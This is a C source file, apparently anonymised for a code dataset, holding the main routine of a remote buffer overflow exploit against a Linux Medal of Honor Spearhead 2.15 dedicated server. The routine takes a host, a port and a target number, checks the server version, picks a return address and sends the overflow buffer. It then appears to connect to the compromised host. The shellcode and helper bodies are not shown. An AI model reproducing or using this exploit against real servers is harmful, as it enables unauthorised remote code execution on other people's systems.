#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  host ;
struct TYPE_2__ {char* type; scalar_t__ ret; } ;

/* Variables and functions */
 int EOF ; 
 int FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*) ; 
 int FUNC3 (char*,int) ; 
 int FUNC4 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,int,int) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 scalar_t__ FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,int /*<<< orphan*/ ,int) ; 
 TYPE_1__* targets ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 

int FUNC12(int argc, char *argv[])
{
char host[256];
int opt, port;
int ver, stat;
int target = 0;
int pid;

FUNC2(stdout, "===================================================\n");
FUNC2(stdout, "Medal of Honor Spearhead Dedicated server for Linux\n");
FUNC2(stdout, "Remote buffer overflow exploit millhouse@IRCnet\n");
FUNC2(stdout, "===================================================\n");

FUNC5(host, 0x00, sizeof(host));
while((opt = FUNC4(argc, argv, "h:p:t:")) != EOF)
{
switch(opt)
{
case 'h':
FUNC10(host, optarg, sizeof(host)-1);
break;

case 'p':
port = FUNC0(optarg);
if((port<=0) || (port > 65535)){
FUNC2(stderr, "[-] Specified port invalid\n");
return(-1);
}
break;

case 't':
target = FUNC0(optarg);
if ((target<1) || (target>6))
FUNC11(argv[0]);
break;

default:
FUNC11(argv[0]);
break;
}
}
if (FUNC9(host) == 0) FUNC11(argv[0]);

ver = FUNC3(host, port);

if(ver<0){
FUNC2(stderr, "[-] Remote server is not a Spearhead 2.15\n");
FUNC2(stderr, "[-] server or its running under Windows\n");
}
else {
FUNC6("[-] Found Spearhead 2.15 (Linux)\n");
FUNC6("[-] Target: 0x%08x ", (unsigned int) targets[target-1].ret);
FUNC6("%s\n", targets[target-1].type);
FUNC6("[-] Sending buffer...\n");

FUNC1(host, port, target);
FUNC8(3);
FUNC7(host);
}

FUNC2(stderr, "[-] Leaving...\n");
}